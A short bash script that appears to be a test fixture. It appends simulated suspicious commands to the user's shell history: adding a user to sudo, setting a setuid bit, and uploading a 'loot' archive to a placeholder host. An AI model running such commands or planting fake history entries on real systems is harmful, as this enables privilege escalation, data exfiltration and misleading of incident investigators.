#!/usr/bin/env bash
set -euo pipefail

echo "Simulating suspicious commands in shell history"
echo "sudo usermod -aG sudo demo" >> "${HOME}/.bash_history"
echo "chmod +s /tmp/fakebin" >> "${HOME}/.bash_history"
echo "curl -T /tmp/loot.tar.gz https://example.com/upload" >> "${HOME}/.bash_history"
